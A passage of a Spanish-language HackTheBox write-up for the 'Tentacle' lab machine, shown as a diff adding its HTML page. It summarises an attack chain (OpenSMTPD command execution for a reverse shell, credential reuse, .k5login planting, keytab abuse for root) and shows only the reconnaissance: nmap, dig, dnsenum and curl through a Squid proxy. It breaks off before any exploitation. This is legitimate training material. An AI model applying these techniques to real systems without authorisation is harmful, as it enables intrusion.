@@ -1,0 +1,2519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Tentacle</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Tentacle | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Tentacle" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel difícil (pareció insana eh!). Nos toparemos con varios dominios escondidos, jugaremos con proxychains para encadenarnos, enumeraremos IPs fantasmas y explotaremos una de ellas que esta corriendo OpenSMTPD. Seguiremos saltando ahora con Kerberos, jugaremos, moveremos, modificaremos y crearemos cositas con él para ser root." />
+<meta property="og:description" content="Máquina Linux nivel difícil (pareció insana eh!). Nos toparemos con varios dominios escondidos, jugaremos con proxychains para encadenarnos, enumeraremos IPs fantasmas y explotaremos una de ellas que esta corriendo OpenSMTPD. Seguiremos saltando ahora con Kerberos, jugaremos, moveremos, modificaremos y crearemos cositas con él para ser root." />
+<link rel="canonical" href="http://localhost:4000/htb/tentacle" />
+<meta property="og:url" content="http://localhost:4000/htb/tentacle" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-19T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310banner.png" />
+<meta property="twitter:title" content="HackTheBox - Tentacle" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-06-19T00:00:00-07:00","datePublished":"2021-06-19T00:00:00-07:00","description":"Máquina Linux nivel difícil (pareció insana eh!). Nos toparemos con varios dominios escondidos, jugaremos con proxychains para encadenarnos, enumeraremos IPs fantasmas y explotaremos una de ellas que esta corriendo OpenSMTPD. Seguiremos saltando ahora con Kerberos, jugaremos, moveremos, modificaremos y crearemos cositas con él para ser root.","headline":"HackTheBox - Tentacle","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/tentacle"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/tentacle"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Tentacle</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-06-19">19 Jun 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310banner.png" alt="HackTheBox - Tentacle">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel difícil (pareció insana eh!). Nos toparemos con varios dominios escondidos, jugaremos con <strong>proxychains</strong> para encadenarnos, enumeraremos IPs fantasmas y explotaremos una de ellas que esta corriendo <strong>OpenSMTPD</strong>. Seguiremos saltando ahora con <strong>Kerberos</strong>, jugaremos, moveremos, modificaremos y crearemos cositas con él para ser <strong>root</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310tentacle.png" alt="310tentacle" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://app.hackthebox.eu/users/159204">polarbearer</a>.</p>
+
+<p>Bueno bueno, vamo a juga…</p>
+
+<p>Locura de máquina, inicialmente exploraremos con <code>dig</code> y <code>dnsenum</code> para encontrar unos dominios (jugando con wordlist). Al tener un proxy en la máquina tendremos que usarlo para saltar a nuevos proxys (relacionados con los dominios que encontramos), nos apoyaremos de <code>proxychains</code> para esta tarea. Jugaremos con él para ejecutar escaneos con <code>nmap</code> sobre cada una de las redes que nos vamos encontrando. Finalmente llegaremos a un host el cual tiene el puerto <strong>80</strong> abierto, usando fuzz encontraremos un archivo de configuración <code>wpad.dat</code> el cual contiene los segmentos que se le deben asignar a los clientes cuando se conecten a la red. De ese archivo tendremos un nuevo segmento de IPs, usando <code>nmap</code> veremos cuáles están activas y que puertos están corriendo.</p>
+
+<p>Nos toparemos con una máquina que esta sirviendo el puerto <strong>25</strong> (SMTP) con el software <strong>OpenSMTPD</strong> el cual tiene una vulnerabilidad de ejecución remota de comandos, nos aprovecharemos de ella para establecer una Reverse Shell en la máquina <code>smtp</code>, todo esto mediante <code>proxychains</code>.</p>
+
+<p>Estando en la máquina <code>smtp</code> (como <strong>root</strong>) nos encontraremos un archivo de configuración <strong>SMTP</strong>, tiene unas credenciales que nos servirán para logearnos como el usuario <strong>j.nawazaka</strong> en el servidor <em>host</em>… Pero para ejecutar esta tarea nos apoyaremos del servicio <code>kerberos</code>, generaremos los respectivos dominios y servidores, asi mismo generaremos el <strong>ticket granting-ticket</strong> para poder establecer la conexión e ingresar al sistema… Despues de este proceso tendremos una Shell mediante <code>SSH</code> como el usuario <strong>j.nakazawa</strong> en el servidor host.</p>
+
+<p>Debemos pivotear al usuario <strong>admin</strong>, enumerando veremos que hay un script el cual genera un backup de todo el contenido de la ruta <code>/var/log/squid/</code> sobre la ruta <code>/home/admin</code>, nos aprovecharemos de esto para mediante el archivo <code>.k5login</code> agregar el usuario <strong>j.nakazawa…</strong> (que esta en la base de datos del servidor de <code>kerberos</code>) a la ruta <code>/home/admin</code>. Este archivo permite establecer conexión al usuario de <code>kerberos</code> sobre la sesión del usuario que contiene el archivo, en este caso el objeto quedo en el <strong>home</strong> de <strong>admin</strong>, por lo tanto usando <code>SSH</code> podremos logearnos como <strong>admin</strong> y obtener una sesión.</p>
+
+<p>Finalmente el usuario <strong>admin</strong> tiene acceso a un archivo bastante interesante/peligroso (<code>/etc/krb5.keytab</code>). Jugando con los comandos de <code>kerberos</code> tendremos varios llamativos, usaremos algunos que nos permitirán jugar con los “target principal name” para asi crear como “target principal” al usuario <strong>root</strong>. Esto nos permitirá obtener una Shell como el usuario <strong>root</strong> sobre el sistema.</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Enumeración a tope peeeero más o menos real 😕</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#movimiento-lateral">Movimiento Lateral</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Realizaremos un escaneo de puertos para saber que servicios esta corriendo la máquina:</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v -Pn 10.10.10.224 -oG allScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td>-Pn</td>
+      <td style="text-align: left">Evita hacer host discovery (ping)</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me permite extraer los puertos y guardarlos en la clipboard, esto para evitar copiar uno a uno (en caso de tener muchos) a mano en nuestro siguiente escaneo.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Pero este escaneo va muyyyyyyyyyyyyy lento, agreguémosle el parámetro <code>--min-rate</code> para que nos envíe X numero de paquetes (el que le pongamos) por cada petición.</p>
+
+<blockquote>
+  <p>Con este escaneo podemos perdernos puertos, por lo tanto es mejor tambien correr el escaneo anterior sin el <code>min-rate</code>. En un momento veremos el resultado.</p>
+</blockquote>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v -Pn --min-rate=2000 10.10.10.224 -oG initScan
+</code></pre>
+
+<p>Va más rápido y obtenemos:</p>
+
+<pre><code class="language-bash">❭ cat initScan 
+# Nmap 7.80 scan initiated Tue Mar  2 25:25:25 2021 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10.10.10.224
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.224 ()   Status: Up
+Host: 10.10.10.224 ()   Ports: 22/open/tcp//ssh///, 53/open/tcp//domain///      Ignored State: filtered (65533)
+# Nmap done at Tue Mar  2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 71.05 seconds
+</code></pre>
+
+<p>Perfecto, nos encontramos los servicios:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong>: Acceso remoto a servidores por medio de un canal seguro.</td>
+    </tr>
+    <tr>
+      <td>53</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Sistema_de_nombres_de_dominio">DNS</a></strong>: Permite la conexión tanto TCP como UDP para comunicarnos con el DNS (Domain Name System).</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Hagamos un escaneo de scripts y versiones con base en cada puerto encontrado, con ello obtenemos información más detallada de cada servicio:</p>
+
+<pre><code class="language-bash">❭ nmap -p 22,53 -sC -sV -Pn 10.10.10.224 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos.</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio.</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio.</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo.</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat portScan 
+# Nmap 7.80 scan initiated Tue Mar  2 25:25:25 2021 as: nmap -p 22,53 -sC -sV -Pn -oN portScan 10.10.10.224
+Nmap scan report for 10.10.10.224
+Host is up (0.12s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
+|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
+|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
+53/tcp open  domain  ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
+| dns-nsid: 
+|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
+Service Info: OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Mar  2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 15.66 seconds
+</code></pre>
+
+<p>Entonces, tenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 8.0 (protocol 2.0)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">53</td>
+      <td style="text-align: left">DNS</td>
+      <td style="text-align: left">ISC BIND 9.11.20 (RedHat Enterprise Linux 8)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>…</p>
+
+<p>Validando el escaneo total (sin <code>min-rate</code>) nos encontramos nuevos servicios activos:</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v -Pn 10.10.10.224 -oG allScan
+</code></pre>
+
+<pre><code class="language-bash">❭ cat allScan
+# Nmap 7.80 scan initiated Tue Mar  2 25:25:25 2021 as: nmap -p- --open -v -Pn -oG allScan 10.10.10.224
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.224 ()   Status: Up
+Host: 10.10.10.224 ()   Ports: 22/open/tcp//ssh///, 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 3128/open/tcp//squid-http///
+# Nmap done at Tue Mar  2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 1725.50 seconds
+</code></pre>
+
+<p>Hagamos el escaneo de versiones y relacionamos lo que encontramos:</p>
+
+<pre><code class="language-bash">❭ nmap -p 22,53,88,3128 -sC -sV -Pn 10.10.10.224 -oN allPortScan
+</code></pre>
+
+<pre><code class="language-bash">❭ cat allPortScan 
+# Nmap 7.80 scan initiated Tue Mar  2 25:25:25 2021 as: nmap -p 22,53,88,3128 -sC -sV -Pn -oN allPortScan 10.10.10.224
+Nmap scan report for 10.10.10.224
+Host is up (0.12s latency).
+
+PORT     STATE SERVICE      VERSION
+22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
+|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
+|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
+53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
+| dns-nsid: 
+|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
+88/tcp   open  kerberos-sec MIT Kerberos (server time: 2021-03-02 18:35:11Z)
+3128/tcp open  http-proxy   Squid http proxy 4.11
+|_http-server-header: squid/4.11
+|_http-title: ERROR: The requested URL could not be retrieved
+Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Mar  2 25:25:25 2021 -- 1 IP address (1 host up) scanned in 28.08 seconds
+</code></pre>
+
+<p>Ahora si, que tenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 8.0 (protocol 2.0)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">53</td>
+      <td style="text-align: left">DNS</td>
+      <td style="text-align: left">ISC BIND 9.11.20 (RedHat Enterprise Linux 8)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">88</td>
+      <td style="text-align: left"><a href="https://es.wikipedia.org/wiki/Kerberos">Kerberos</a></td>
+      <td style="text-align: left">MIT Kerberos (Permite a dos ordenadores en una red insegura demostrar su identidad de manera segura)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">3128</td>
+      <td style="text-align: left"><a href="https://www.ionos.es/digitalguide/servidores/configuracion/squid-el-servidor-proxy-cache-de-codigo-abierto/">Squid-Proxy</a></td>
+      <td style="text-align: left">Squid http proxy 4.11 (Servidor proxy para webs con cache)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Que destacamos:</p>
+
+<p><strong>Puerto 22:</strong></p>
+
+<ul>
+  <li>No me había encontrado con esa versión hasta ahora, asi que puede ser interesante.</li>
+</ul>
+
+<p><strong>Service Info:</strong></p>
+
+<ul>
+  <li>Tenemos un dominio: <code>realcorp.htb</code>.</li>
+</ul>
+
+<p>…</p>
+
+<h3 id="puerto-53">Puerto 53 (DNS) <a href="#puerto-53">⌖</a></h3>
+
+<p>Hay una herramienta muy útil para cuando tenemos el puerto <strong>DNS</strong> accesible llamada <code>DIG</code>, podemos hacer varias cosas con ella:</p>
+
+<blockquote>
+  <p>Dig (Domain Information Groper): Utility that performs DNS lookup by querying name servers and displaying the result to you. <a href="https://www.hostinger.com/tutorials/how-to-use-the-dig-command-in-linux/">How to use dig command</a>.</p>
+</blockquote>
+
+<p>Entonces intentara buscar dominios que resuelvan a nuestro servidor</p>
+
+<p>Si queremos hacer una búsqueda de todos los DNS válidos, podemos usar <code>ANY</code>:</p>
+
+<pre><code class="language-bash">❭ dig ANY @10.10.10.224
+
+; &lt;&lt;&gt;&gt; DiG 9.16.2-Debian &lt;&lt;&gt;&gt; ANY @10.10.10.224
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: SERVFAIL, id: 50996
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: e8b7300acf9dc80370fb538e603e8a54a597e579a036adfe (good)
+;; QUESTION SECTION:
+;.                              IN      NS
+
+;; Query time: 115 msec
+;; SERVER: 10.10.10.224#53(10.10.10.224)
+;; WHEN: mar mar 02 25:25:25 -05 2021
+;; MSG SIZE  rcvd: 56
+</code></pre>
+
+<p>De acá nos damos cuenta de que esta respondiéndonos con una <code>cookie</code>, pero no tenemos nada más… Con los demás argumentos obtenemos lo mismo solo que la cookie va cambiando.</p>
+
+<p>Buscando por internet más formas de enumerar el puerto <code>DNS</code> nos encontramos con este post sobre algunas herramientas y en el que se toca sobre <code>dnsenum</code> que nos ayuda a efectuar lo mismo que <code>dig</code>, pero también tiene la utilidad de encontrar subdominios que no están expuestos.</p>
+
+<ul>
+  <li><a href="https://linuxhint.com/dns_reconnaissance_linux/">Articulo del que me guie para usarlo</a>.</li>
+  <li><a href="http://www.reydes.com/d/?q=DNSenum">Como usar <strong>dnsenum</strong> en linux</a>.</li>
+</ul>
+
+<p>Su uso básico seria:</p>
+
+<pre><code class="language-bash">❭ dnsenum realcorp.htb -f /usr/share/dirbuster/wordlists/directories.jbrofuzz
+</code></pre>
+
+<p>Donde le pasamos el dominio y una wordlist para que vaya probando. Pero esta ejecucion nos da error porque no entiende hacia donde responde el dominio <code>realcorp.htb</code></p>
+
+<pre><code class="language-bash">❭ dnsenum realcorp.htb -f /usr/share/dirbuster/wordlists/directories.jbrofuzz
+</code></pre>
+
+<pre><code class="language-bash">dnsenum VERSION:1.2.6
+
+-----   realcorp.htb   -----
+
+
+Host's addresses:
+__________________
+
+
+
+Name Servers:
+______________
+
+realcorp.htb NS record query failed: NXDOMAIN
+</code></pre>
+
+<p>Viendo las opciones de la herramienta, podemos pasarle el servidor <code>dns</code> al que hace referencia ese dominio con el argumento <code>--dnsserver</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_dnsenum_without_seclist.png" alt="310bash_dnsenum_without_seclist" /></p>
+
+<p>Vale, obtenemos un nuevo dominio e IP, pero el wordlist no nos encontró nada, intentemos modificar el wordlist por uno más especializado en fuzzing de <code>DNS</code>:</p>
+
+<pre><code class="language-bash">❭ dnsenum --dnsserver 10.10.10.224 realcorp.htb -f /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+</code></pre>
+
+<p>Esto toma mucho tiempo, pongámosle hilos y veamos la respuesta:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310bash_dnsenum_with_seclist.png" alt="310bash_dnsenum_with_seclist" /></p>
+
+<p>Perfecto, finalmente conseguimos nuevos dominios y sus respectivas IPS “ “:</p>
+
+<ul>
+  <li><code>ns.realcorp.htb</code> -&gt; <code>10.197.243.77</code></li>
+  <li><code>proxy.realcorp.htb</code></li>
+  <li><code>wpad.realcorp.htb</code> -&gt; <code>10.197.243.31</code> (este se ve interesante, ya que es único)</li>
+</ul>
+
+<p>Pero intentando interactuar con alguna de esas direcciones no obtenemos respuesta…</p>
+
+<p>Por el momento no podemos hacer nada con estos dominios… Sigamos enumerando.</p>
+
+<p>…</p>
+
+<h3 id="puerto-88">Puerto 88 (Kerberos) <a href="#puerto-88">⌖</a></h3>
+
+<p>Si validamos en la web a ver si nos responde algo, nos damos cuenta de que al hacer la petición intenta responder con algo, pero de una vez nos indica que no hay conexión. Si somos medio rápidos :P podemos frenar la petición antes de que nos muestre que <strong>no hay conexión</strong> y tendríamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310page88.png" alt="310page88" /></p>
+
+<p>Pues solo vemos el dominio que ya habíamos encontrado.</p>
+
+<ul>
+  <li><code>REALCORP.HTB</code></li>
+</ul>
+
+<p>Por el momento nada más…</p>
+
+<p>…</p>
+
+<h3 id="puerto-3128">Puerto 3128 (Squid Proxy) <a href="#puerto-3128">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tentacle/310page3128.png" alt="310page3128" /></p>
+
+<p>Opa, este servicio nos spoilea con algunas cosas:</p>
+
+<ul>
+  <li>Your cache administrator is <code>j.nakazawa@realcorp.htb</code>
+    <ul>
+      <li>Nos indica que efectivamente el dominio es <code>realcorp.htb</code>.</li>
+      <li>Nos da un usuario potencial.</li>
+      <li>Nos muestra un posible patrón de como son creados los usuarios, <strong><code>inicialnombre.apellido@dominio</code></strong> (puede que nos sirva de algo).</li>
+    </ul>
+  </li>
+  <li>Tenemos otro dominio: <code>srv01.realcorp.htb</code></li>
+</ul>
+
+<p>Bueno, probemos a colocar los dos dominios en el archivo <code>/etc/hosts</code> a ver si obtenemos algo diferente.</p>
+
+<pre><code class="language-bash">❭ cat /etc/hosts
+...
+10.10.10.224  realcorp.htb srv01.realcorp.htb
+...
+</code></pre>
+
+<p>Pero pues seguimos obteniendo lo mismo que antes.</p>
+
+<p>Esto lo solucionamos pensando un toque… ¿Para qué tenemos el proxy? Pues precisamente para evitar estos problemitas, ya que es el intermediario entre nosotros y el dominio :P</p>
+
+<p>Con <code>cURL</code> podemos ver el ejemplo perfecto. Intentemos hacer una petición hacia el dominio encontrado:</p>
+
+<pre><code class="language-bash">❭ curl -v http://realcorp.htb
+</code></pre>
+
+<pre><code class="language-bash">* Trying 10.10.10.224:80...
+* connect to 10.10.10.224 port 80 failed: No existe ninguna ruta hasta el `host'
+* Failed to connect to realcorp.htb port 80: No existe ninguna ruta hasta el `host'
+* Closing connection 0
+curl: (7) Failed to connect to realcorp.htb port 80: No existe ninguna ruta hasta el `host'
+</code></pre>
+
+<p>No obtenemos respuesta, pero si le indicamos que queremos conectarnos al dominio peeero a través del proxy (que es el que nos permite ver ese dominio):</p>
+
+<pre><code class="language-bash">❭ curl -v http://realcorp.htb --proxy 10.10.10.224:3128
+</code></pre>
+
+<pre><code class="language-bash">* Trying 10.10.10.224:3128...
+* Connected to 10.10.10.224 (10.10.10.224) port 3128 (#0)
+&gt; GET http://realcorp.htb/ HTTP/1.1
+&gt; Host: realcorp.htb
+&gt; User-Agent: curl/7.74.0
+&gt; Accept: */*
+&gt; Proxy-Connection: Keep-Alive
+&gt;
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 407 Proxy Authentication Required
+&lt; Server: squid/4.11
+&lt; Mime-Version: 1.0
+&lt; Date: Tue, 02 Mar 2021 19:28:22 GMT
+&lt; Content-Type: text/html;charset=utf-8
+&lt; Content-Length: 3552
+&lt; X-Squid-Error: ERR_CACHE_ACCESS_DENIED 0
+&lt; Vary: Accept-Language
+&lt; Content-Language: en
+&lt; Proxy-Authenticate: Basic realm="Web-Proxy"
+&lt; X-Cache: MISS from srv01.realcorp.htb
+&lt; X-Cache-Lookup: NONE from srv01.realcorp.htb:3128
+&lt; Via: 1.1 srv01.realcorp.htb (squid/4.11)
+&lt; Connection: keep-alive
+&lt;
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;meta type="copyright" content="Copyright (C) 1996-2020 The Squid Software Foundation and contributors"&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;
+&lt;title&gt;ERROR: Cache Access Denied&lt;/title&gt;
+&lt;style type="text/css"&gt;&lt;!--
+...
+</code></pre>
+
+<p>Perfecto, estamos viendo la respuesta real hacia el dominio. Nos indica <strong>Cache Access Denied</strong>… Validando el final de la respuesta tenemos:</p>
+
+<pre><code class="language-html">&lt;/head&gt;&lt;body id=ERR_CACHE_ACCESS_DENIED&gt;
+&lt;div id="titles"&gt;
+&lt;h1&gt;ERROR&lt;/h1&gt;
+&lt;h2&gt;Cache Access Denied.&lt;/h2&gt;
+&lt;/div&gt;
+&lt;hr&gt;
+
+&lt;div id="content"&gt;
+&lt;p&gt;The following error was encountered while trying to retrieve the URL: &lt;a href="http://realcorp.htb/"&gt;http://realcorp.htb/&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote id="error"&gt;
+&lt;p&gt;&lt;b&gt;Cache Access Denied.&lt;/b&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Sorry, you are not currently allowed to request http://realcorp.htb/ from this cache until you have authenticated yourself.&lt;/p&gt;
+
